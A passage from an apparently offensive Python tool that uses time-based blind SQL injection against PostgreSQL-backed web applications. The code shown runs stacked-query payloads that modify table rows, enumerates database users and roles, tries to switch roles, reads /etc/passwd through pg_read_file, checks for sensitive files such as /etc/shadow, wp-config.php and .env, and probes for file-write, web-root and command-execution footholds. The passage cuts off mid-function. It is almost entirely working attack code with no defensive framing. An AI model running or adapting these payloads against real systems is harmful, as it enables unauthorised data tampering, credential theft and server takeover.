    sql_query = f"(SELECT pg_sleep(0); BEGIN; SAVEPOINT before_update; UPDATE {database}.{table_name} SET {column_name}={quoted_value} WHERE {search_column}='{search_value}'; COMMIT; SELECT CASE WHEN 1=1 THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 7 SUCCESS! Savepoint transaction worked")
        update_success = True
    else:
        print("[-] Strategy 7 failed")
    
    # Strategy 8: Try using a function-based update
    print("\n[*] Strategy 8: Using function-based value update...")
    sql_query = f"(CASE WHEN (UPDATE {database}.{table_name} SET {column_name}=COALESCE({quoted_value}, {column_name}) WHERE {search_column}='{search_value}' RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 8 SUCCESS! Function-based update worked")
        update_success = True
    else:
        print("[-] Strategy 8 failed")
    
    # If we found the date_modified column, try a special strategy
    if date_modified_exists:
        print("\n[*] Strategy 9: Explicitly handling date_modified column...")
        # Get current timestamp to use
        current_time = int(time.time())
        sql_query = f"(CASE WHEN (UPDATE {database}.{table_name} SET {column_name}={quoted_value}, date_modified=NOW() WHERE {search_column}='{search_value}' RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        strategies_tried += 1
        
        if success:
            print("[+] Strategy 9 SUCCESS! Update with explicit date_modified worked")
            update_success = True
        else:
            print("[-] Strategy 9 failed")
    
    # Strategy 10: Direct row update using ctid (physical row identifier)
    print("\n[*] Strategy 10: Using ctid (physical row identifier) for direct update...")
    sql_query = f"(WITH target_row AS (SELECT ctid FROM {database}.{table_name} WHERE {search_column}='{search_value}' LIMIT 1) UPDATE {database}.{table_name} SET {column_name}={quoted_value} FROM target_row WHERE {database}.{table_name}.ctid = target_row.ctid; SELECT CASE WHEN 1=1 THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 10 SUCCESS! Direct row update using ctid worked")
        update_success = True
    else:
        print("[-] Strategy 10 failed")
    
    # Check if the update worked by reading the updated value
    print("\n[*] Verifying if any update strategy succeeded...")
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} WHERE {search_column}='{search_value}' AND {column_name}={quoted_value}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    verification, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if verification:
        print("[+] VERIFICATION SUCCESSFUL! The value has been changed to the new value.")
        # Get the current value again to be sure
        sql_fragment = f"(SELECT {column_name} FROM {database}.{table_name} WHERE {search_column}='{search_value}' LIMIT 1)"
        new_current_value = extract_string_parallel(request_info, sql_fragment, f"New value of {column_name}", verbose=False)
        print(f"[+] Column {column_name} now contains: '{new_current_value}'")
        update_success = True
    else:
        print("[-] Verification failed. The value does not appear to have changed.")
        if has_triggers:
            print("[!] This is likely due to triggers blocking the update.")
            
            if date_modified_exists:
                print("[!] The 'update_date_modified' trigger should just update a timestamp, not block the update.")
                print("[!] There may be additional validation triggers or constraints we haven't discovered.")
            
        # Try one more time to see current value
        sql_fragment = f"(SELECT {column_name} FROM {database}.{table_name} WHERE {search_column}='{search_value}' LIMIT 1)"
        current_value = extract_string_parallel(request_info, sql_fragment, f"Current value of {column_name}", verbose=False)
        print(f"[+] Column {column_name} still contains: '{current_value}'")
    
    print("\n" + "=" * 75)
    print(f"UPDATE SUMMARY: {strategies_tried} strategies attempted")
    
    if update_success:
        print(f"[+] Successfully updated {column_name} to '{new_value}'")
        return True
    else:
        print(f"[!] Failed to update {column_name} despite having proper permissions.")
        print(f"[!] Analysis of the update_date_modified trigger:")
        print("    - This trigger simply updates a timestamp when rows are modified")
        print("    - It shouldn't prevent legitimate updates, but just record when they happen")
        print("    - Since updates are still failing, there are likely other factors:")
        print("      1. Additional triggers not visible to us")
        print("      2. Column-level permissions or constraints")
        print("      3. Application-level validation rules")
        print("      4. Row-level security policies")
        print("\nSuggestions:")
        print("  1. Try updating a different column that might have fewer restrictions")
        print("  2. Try a read-only approach to access the data you need")
        print("  3. Check if other tables have fewer restrictions")
        
        return False

def check_user_permissions(request_info, table_name, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Check the current user's permissions in the database"""
    print("\n[*] Checking current user permissions...")
    
    # Get current user first
    current_user = extract_current_user(request_info, verbose)
    if not current_user:
        print("[!] Could not determine current database user")
        return False
    
    print(f"[+] Connected as user: {current_user}")
    
    # Check superuser status
    sql_query = f"(CASE WHEN (SELECT usesuper FROM pg_user WHERE usename = current_user) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    is_superuser, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    print(f"[+] Superuser: {'Yes' if is_superuser else 'No'}")
    
    # Check role memberships
    print("\n[*] Checking role memberships...")
    
    # Check if the current user is member of any roles
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_auth_members m JOIN pg_roles r ON m.roleid = r.oid JOIN pg_roles ur ON m.member = ur.oid WHERE ur.rolname = current_user) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_roles, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_roles:
        print("[+] User is a member of one or more roles/groups")
    else:
        print("[-] User is not a member of any roles/groups")
    
    # Check general permissions on the specified table
    if table_name:
        print(f"\n[*] Checking permissions on table '{database}.{table_name}'...")
        
        # Check if table exists
        sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='{database}' AND table_name='{table_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        table_exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if not table_exists:
            print(f"[!] Table '{database}.{table_name}' does not exist")
            return False
        
        # Check SELECT permission
        sql_query = f"(CASE WHEN (SELECT has_table_privilege(current_user, '{database}.{table_name}', 'SELECT')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_select, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] SELECT permission: {'Yes' if has_select else 'No'}")
        
        # Check INSERT permission
        sql_query = f"(CASE WHEN (SELECT has_table_privilege(current_user, '{database}.{table_name}', 'INSERT')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_insert, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] INSERT permission: {'Yes' if has_insert else 'No'}")
        
        # Check UPDATE permission
        sql_query = f"(CASE WHEN (SELECT has_table_privilege(current_user, '{database}.{table_name}', 'UPDATE')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_update, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] UPDATE permission: {'Yes' if has_update else 'No'}")
        
        # Check DELETE permission
        sql_query = f"(CASE WHEN (SELECT has_table_privilege(current_user, '{database}.{table_name}', 'DELETE')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_delete, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] DELETE permission: {'Yes' if has_delete else 'No'}")
        
        # Check if table has any triggers
        sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.triggers WHERE event_object_schema='{database}' AND event_object_table='{table_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_triggers, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] Table has triggers: {'Yes' if has_triggers else 'No'}")
        
        # Check row-level security
        sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_catalog.pg_class c JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relname = '{table_name}' AND n.nspname = '{database}' AND c.relrowsecurity = true) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_rls, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        print(f"[+] Row-level security enabled: {'Yes' if has_rls else 'No'}")
        
        # Show permissions summary
        print("\n[*] Permissions summary:")
        print("=" * 40)
        print(f"User: {current_user}")
        print(f"Superuser: {'Yes' if is_superuser else 'No'}")
        print(f"Table: {database}.{table_name}")
        print(f"SELECT: {'Yes' if has_select else 'No'}")
        print(f"INSERT: {'Yes' if has_insert else 'No'}")
        print(f"UPDATE: {'Yes' if has_update else 'No'}")
        print(f"DELETE: {'Yes' if has_delete else 'No'}")
        print("=" * 40)
        
        if has_update:
            print("[+] User has UPDATE permission on this table")
            if has_triggers:
                print("[!] However, table has triggers which might prevent updates")
            if has_rls:
                print("[!] Row-level security is enabled which might restrict updates to specific rows")
        else:
            print("[!] User does NOT have UPDATE permission on this table")
            print("[!] This explains why UPDATE operations fail")
        
        return has_update
    else:
        print("\n[*] No specific table provided for permission check")
        return False

def list_database_users(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """List database users and their roles/permissions"""
    print("\n[*] Attempting to list database users and roles...")
    
    # First, check if we can access pg_user
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_user LIMIT 1) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_access_pg_user, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_access_pg_user:
        print("[+] We have access to pg_user! Listing users...")
        
        # Get user count
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM pg_user) > 0) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_users, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if has_users:
            # Count users
            user_count = 0
            for i in range(1, 100):  # Limit to reasonable number
                sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM pg_user) >= {i}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                more_users, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                
                if not more_users:
                    user_count = i - 1
                    break
            
            print(f"[+] Found {user_count} database users")
            
            # Extract user names and privileges
            users_info = []
            for i in range(user_count):
                # Get username 
                sql_fragment = f"(SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET {i})"
                username = extract_string_parallel(request_info, sql_fragment, f"Username #{i+1}", verbose)
                
                if username:
                    # Check if superuser
                    sql_query = f"(CASE WHEN ((SELECT usesuper FROM pg_user WHERE usename='{username}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                    is_superuser, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                    
                    # Check if can create databases
                    sql_query = f"(CASE WHEN ((SELECT usecreatedb FROM pg_user WHERE usename='{username}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                    can_create_db, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                    
                    # Check if can create roles
                    sql_query = f"(CASE WHEN ((SELECT usecreaterole FROM pg_user WHERE usename='{username}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                    can_create_role, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                    
                    # Add to our list
                    user_info = {
                        'username': username,
                        'superuser': is_superuser,
                        'can_create_db': can_create_db,
                        'can_create_role': can_create_role
                    }
                    users_info.append(user_info)
                    
                    # Print info
                    print(f"[+] User: {username}")
                    print(f"    - Superuser: {'Yes' if is_superuser else 'No'}")
                    print(f"    - Can create DB: {'Yes' if can_create_db else 'No'}")
                    print(f"    - Can create roles: {'Yes' if can_create_role else 'No'}")
            
            # Save users to file
            save_user_list_to_file(users_info)
            
            return users_info
    else:
        print("[-] Cannot access pg_user table. Trying alternative approach...")
    
    # Try with pg_roles view instead
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_roles LIMIT 1) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_access_pg_roles, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_access_pg_roles:
        print("[+] We have access to pg_roles! Listing roles...")
        
        # Get role count
        role_count = 0
        for i in range(1, 100):  # Limit to reasonable number
            sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM pg_roles) >= {i}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            more_roles, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
            
            if not more_roles:
                role_count = i - 1
                break
        
        print(f"[+] Found {role_count} database roles")
        
        # Extract role names and privileges
        roles_info = []
        for i in range(role_count):
            # Get rolename
            sql_fragment = f"(SELECT rolname FROM pg_roles ORDER BY rolname LIMIT 1 OFFSET {i})"
            rolename = extract_string_parallel(request_info, sql_fragment, f"Role #{i+1}", verbose)
            
            if rolename:
                # Check if superuser
                sql_query = f"(CASE WHEN ((SELECT rolsuper FROM pg_roles WHERE rolname='{rolename}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                is_superuser, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                
                # Check if can create databases
                sql_query = f"(CASE WHEN ((SELECT rolcreatedb FROM pg_roles WHERE rolname='{rolename}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                can_create_db, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                
                # Check if can create roles
                sql_query = f"(CASE WHEN ((SELECT rolcreaterole FROM pg_roles WHERE rolname='{rolename}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                can_create_role, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                
                # Add to our list
                role_info = {
                    'rolename': rolename,
                    'superuser': is_superuser,
                    'can_create_db': can_create_db,
                    'can_create_role': can_create_role
                }
                roles_info.append(role_info)
                
                # Print info
                print(f"[+] Role: {rolename}")
                print(f"    - Superuser: {'Yes' if is_superuser else 'No'}")
                print(f"    - Can create DB: {'Yes' if can_create_db else 'No'}")
                print(f"    - Can create roles: {'Yes' if can_create_role else 'No'}")
        
        # Save roles to file
        save_role_list_to_file(roles_info)
        
        return roles_info
    else:
        print("[-] Cannot access pg_roles view.")
    
    print("[!] Could not list database users through pg_user or pg_roles")
    print("[!] This suggests your database user has limited privileges or these views are restricted")
    
    return []

def save_user_list_to_file(users_info):
    """Save the list of database users to files"""
    # Save as JSON
    with open('database_users.json', 'w') as f:
        json.dump(users_info, f, indent=2)
    
    # Save as text
    with open('database_users.txt', 'w') as f:
        f.write("DATABASE USERS\n")
        f.write("=============\n\n")
        
        for user in users_info:
            f.write(f"Username: {user['username']}\n")
            f.write(f"  Superuser: {'Yes' if user['superuser'] else 'No'}\n")
            f.write(f"  Can create databases: {'Yes' if user['can_create_db'] else 'No'}\n")
            f.write(f"  Can create roles: {'Yes' if user['can_create_role'] else 'No'}\n")
            f.write("\n")
    
    print(f"[+] User information saved to database_users.json and database_users.txt")

def save_role_list_to_file(roles_info):
    """Save the list of database roles to files"""
    # Save as JSON
    with open('database_roles.json', 'w') as f:
        json.dump(roles_info, f, indent=2)
    
    # Save as text
    with open('database_roles.txt', 'w') as f:
        f.write("DATABASE ROLES\n")
        f.write("=============\n\n")
        
        for role in roles_info:
            f.write(f"Role: {role['rolename']}\n")
            f.write(f"  Superuser: {'Yes' if role['superuser'] else 'No'}\n")
            f.write(f"  Can create databases: {'Yes' if role['can_create_db'] else 'No'}\n")
            f.write(f"  Can create roles: {'Yes' if role['can_create_role'] else 'No'}\n")
            f.write("\n")
    
    print(f"[+] Role information saved to database_roles.json and database_roles.txt")

def attempt_user_change(request_info, target_user, verbose=False, resume_file='psql_extraction.resume'):
    """Attempt to change the current database user"""
    print(f"\n[*] Attempting to change current database user to '{target_user}'...")
    
    # First, check if the target user exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_user WHERE usename='{target_user}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    user_exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not user_exists:
        print(f"[!] Target user '{target_user}' does not exist in the database")
        return False
    
    # Get current user for comparison
    current_user = extract_current_user(request_info, verbose)
    if current_user == target_user:
        print(f"[!] Already connected as '{target_user}'")
        return True
    
    print(f"[*] Current user is '{current_user}', attempting to change to '{target_user}'...")
    
    # Try approach 1: SET ROLE
    print("[*] Approach 1: Using SET ROLE command...")
    sql_query = f"(SELECT pg_sleep(0); SET ROLE {target_user}; SELECT CASE WHEN current_user = '{target_user}' THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if success:
        print(f"[+] Successfully changed to user '{target_user}' using SET ROLE")
        return True
    else:
        print("[-] SET ROLE approach failed")
    
    # Try approach 2: SET SESSION AUTHORIZATION
    print("[*] Approach 2: Using SET SESSION AUTHORIZATION command...")
    sql_query = f"(SELECT pg_sleep(0); SET SESSION AUTHORIZATION {target_user}; SELECT CASE WHEN current_user = '{target_user}' THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if success:
        print(f"[+] Successfully changed to user '{target_user}' using SET SESSION AUTHORIZATION")
        return True
    else:
        print("[-] SET SESSION AUTHORIZATION approach failed")
    
    # Try approach 3: Use DO block with SECURITY DEFINER function
    print("[*] Approach 3: Attempting to use a DO block with SECURITY DEFINER...")
    sql_query = f"""(DO $$
    BEGIN
        EXECUTE 'SET ROLE {target_user}';
    END $$;
    SELECT CASE WHEN current_user = '{target_user}' THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"""
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if success:
        print(f"[+] Successfully changed to user '{target_user}' using DO block")
        return True
    else:
        print("[-] DO block approach failed")
    
    # Check after all attempts
    print("[*] Verifying current user after attempts...")
    new_current_user = extract_current_user(request_info, verbose)
    
    if new_current_user == target_user:
        print(f"[+] Successfully changed current user to '{target_user}'")
        return True
    else:
        print(f"[!] Failed to change user. Still running as '{new_current_user}'")
        print("[!] This is expected - changing users typically requires:")
        print("    1. Superuser privileges")
        print("    2. Special permissions granted to your current user")
        print("    3. A new database connection (not possible via SQL injection)")
        return False

def check_file_write_capabilities(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """Check if the database allows writing files to the filesystem"""
    print("\n[*] Checking for file write capabilities...")
    write_capabilities = {
        'can_write_files': False,
        'methods_available': [],
        'details': {}
    }
    
    # Check 1: Test if COPY TO is available and permitted
    print("[*] Checking COPY TO command permissions...")
    sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_catalog.lo_export(oid, text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_lo_export, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_lo_export:
        print("[+] User has permission to use lo_export() function!")
        write_capabilities['methods_available'].append('lo_export')
        write_capabilities['details']['lo_export'] = "Can use lo_export() to write files"
    else:
        print("[-] User cannot use lo_export()")
    
    # Check 2: Test for pg_write_binary_file (available in some versions)
    print("[*] Checking for pg_write_binary_file function...")
    sql_query = f"(CASE WHEN (SELECT count(*) FROM pg_proc WHERE proname = 'pg_write_binary_file') > 0 THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_write_binary, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_write_binary:
        print("[+] pg_write_binary_file function exists!")
        
        # Check if user has permission to execute it
        sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_write_binary_file(text, bytea)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        can_execute_write, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if can_execute_write:
            print("[+] User has permission to execute pg_write_binary_file!")
            write_capabilities['methods_available'].append('pg_write_binary_file')
            write_capabilities['details']['pg_write_binary_file'] = "Can use pg_write_binary_file() to write files"
        else:
            print("[-] User cannot execute pg_write_binary_file")
    else:
        print("[-] pg_write_binary_file function does not exist")
    
    # Check 3: Check COPY TO file permissions
    print("[*] Checking COPY TO file permissions...")
    sql_query = f"(CASE WHEN (SELECT pg_catalog.has_table_privilege(current_user, 'pg_catalog.pg_class', 'SELECT')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_select, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_select:
        # Now check if COPY is available
        sql_query = f"(CASE WHEN (SELECT pg_catalog.has_table_privilege(current_user, 'pg_catalog.pg_class', 'COPY FROM')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        can_copy, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if can_copy:
            print("[+] User has COPY FROM permission!")
            write_capabilities['methods_available'].append('COPY FROM')
            write_capabilities['details']['COPY FROM'] = "Can use COPY FROM to write files"
        else:
            print("[-] User does not have COPY FROM permission")
    else:
        print("[-] User cannot SELECT from pg_catalog.pg_class")
    
    # Check 4: Test if user can create tables (needed for some COPY operations)
    print("[*] Checking if user can create tables...")
    sql_query = f"(CASE WHEN (SELECT pg_catalog.has_schema_privilege(current_user, 'public', 'CREATE')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_create_tables, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_create_tables:
        print("[+] User can CREATE tables in public schema!")
        write_capabilities['details']['create_tables'] = "Can create tables in public schema"
    else:
        print("[-] User cannot CREATE tables in public schema")
    
    # Final assessment
    if write_capabilities['methods_available']:
        write_capabilities['can_write_files'] = True
        print("\n[!] FILE WRITE CAPABILITY DETECTED!")
        print("[!] This database user appears to have methods available that could")
        print("[!] potentially be used to write files to the server's filesystem.")
        
        for method in write_capabilities['methods_available']:
            print(f"    - {method}: {write_capabilities['details'][method]}")
        
        # Check for web server paths
        print("\n[*] Checking for common web server paths...")
        common_paths = [
            '/var/www/html',
            '/var/www',
            '/usr/local/www',
            '/usr/share/nginx',
            '/usr/share/apache2',
            '/srv/www',
            '/opt/lampp/htdocs'
        ]
        
        for path in common_paths:
            sql_query = f"(CASE WHEN (SELECT pg_catalog.pg_file_exists('{path}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            path_exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
            
            if path_exists:
                print(f"[+] Found potential web server path: {path}")
                write_capabilities['details']['web_paths'] = write_capabilities.get('details', {}).get('web_paths', []) + [path]
    else:
        print("\n[-] No file write capabilities detected with current user")
    
    return write_capabilities

def check_file_read_capabilities(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """Check if the database allows reading files from the filesystem"""
    print("\n[*] Checking for file read capabilities...")
    read_capabilities = {
        'can_read_files': False,
        'methods_available': [],
        'details': {},
        'sample_content': None
    }
    
    # Check 1: Test if pg_read_file is available and permitted
    print("[*] Checking pg_read_file function permissions...")
    sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_catalog.pg_read_file(text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_read_file, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_read_file:
        print("[+] User has permission to use pg_read_file() function!")
        read_capabilities['methods_available'].append('pg_read_file')
        read_capabilities['details']['pg_read_file'] = "Can use pg_read_file() to read files"
        
        # Try to read /etc/passwd first line safely
        print("[*] Attempting to read first line of /etc/passwd...")
        passwd_content = extract_string_parallel(
            request_info,
            "SELECT SUBSTRING(pg_read_file('/etc/passwd'), 1, 100)",
            "passwd_content",
            verbose,
            print_result=True
        )
        
        if passwd_content and ":" in passwd_content:
            print(f"[+] Successfully read from /etc/passwd: {passwd_content}")
            read_capabilities['sample_content'] = passwd_content
        else:
            print("[-] Could not read /etc/passwd content")
    else:
        print("[-] User cannot use pg_read_file()")
    
    # Check 2: Test for pg_read_binary_file (available in some versions)
    print("[*] Checking for pg_read_binary_file function...")
    sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_catalog.pg_read_binary_file(text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_read_binary, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_read_binary:
        print("[+] User has permission to use pg_read_binary_file() function!")
        read_capabilities['methods_available'].append('pg_read_binary_file')
        read_capabilities['details']['pg_read_binary_file'] = "Can use pg_read_binary_file() to read files"
    else:
        print("[-] User cannot use pg_read_binary_file()")
    
    # Check 3: Test if lo_import is available
    print("[*] Checking lo_import function permissions...")
    sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_catalog.lo_import(text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_lo_import, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_lo_import:
        print("[+] User has permission to use lo_import() function!")
        read_capabilities['methods_available'].append('lo_import')
        read_capabilities['details']['lo_import'] = "Can use lo_import() to read files"
    else:
        print("[-] User cannot use lo_import()")
    
    # Final assessment
    if read_capabilities['methods_available']:
        read_capabilities['can_read_files'] = True
        print("\n[!] FILE READ CAPABILITY DETECTED!")
        print("[!] This database user appears to have methods available that could")
        print("[!] potentially be used to read files from the server's filesystem.")
        
        for method in read_capabilities['methods_available']:
            print(f"    - {method}: {read_capabilities['details'][method]}")
        
        if read_capabilities['sample_content']:
            print(f"\n[+] Sample content from /etc/passwd:")
            print(f"    {read_capabilities['sample_content']}")
        
        # Check for important files
        important_files = [
            '/etc/shadow',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/self/environ',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
            '.env',
            'config.ini'
        ]
        
        print("\n[*] Checking for important files...")
        for file_path in important_files:
            sql_query = f"(CASE WHEN (SELECT pg_catalog.pg_file_exists('{file_path}')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            file_exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
            
            if file_exists:
                print(f"[+] Found potentially interesting file: {file_path}")
                if 'interesting_files' not in read_capabilities['details']:
                    read_capabilities['details']['interesting_files'] = []
                read_capabilities['details']['interesting_files'].append(file_path)
    else:
        print("\n[-] No file read capabilities detected with current user")
    
    return read_capabilities

def check_command_execution_capabilities(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """Check if command execution might be possible through the database"""
    print("\n[*] Checking for command execution capabilities...")
    exec_capabilities = {
        'can_execute_commands': False,
        'methods_available': [],
        'details': {}
    }
    
    # Check 1: Look for dangerous procedural languages
    print("[*] Checking for dangerous procedural languages...")
    dangerous_langs = ['plpythonu', 'plperlu', 'plruby', 'plsh', 'pltclu']
    available_langs = []
    
    for lang in dangerous_langs:
        sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_language WHERE lanname='{lang}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        lang_exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if lang_exists:
            print(f"[+] Dangerous language {lang} is installed!")
            available_langs.append(lang)
    
    if available_langs:
        exec_capabilities['methods_available'].append('procedural_language')
        exec_capabilities['details']['procedural_languages'] = available_langs
    else:
        print("[-] No dangerous procedural languages found")
    
    # Check 2: Check if user can create functions
    print("[*] Checking if user can create functions...")
    sql_query = f"(CASE WHEN (SELECT pg_catalog.has_function_privilege(current_user, 'pg_catalog.pg_proc', 'CREATE')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_create_function, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_create_function:
        print("[+] User can CREATE FUNCTION!")
        exec_capabilities['methods_available'].append('create_function')
        exec_capabilities['details']['create_function'] = "Can create functions"
    else:
        print("[-] User cannot CREATE FUNCTION")
    
    # Check 3: Check for dblink extension
    print("[*] Checking for dblink extension...")
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM pg_extension WHERE extname='dblink') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_dblink, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if has_dblink:
        print("[+] dblink extension is installed!")
        
        # Check if user can use dblink
        sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'dblink_connect(text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        can_use_dblink, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if can_use_dblink:
            print("[+] User can execute dblink_connect function!")
            exec_capabilities['methods_available'].append('dblink')
            exec_capabilities['details']['dblink'] = "Can use dblink for potential command execution"
        else:
            print("[-] User cannot execute dblink_connect")
    else:
        print("[-] dblink extension is not installed")
    
    # Check 4: Check for access to pg_ls_dir (indicates filesystem access)
    print("[*] Checking for pg_ls_dir function access...")
    sql_query = f"(CASE WHEN (SELECT has_function_privilege(current_user, 'pg_catalog.pg_ls_dir(text)', 'execute')) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    can_ls_dir, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if can_ls_dir:
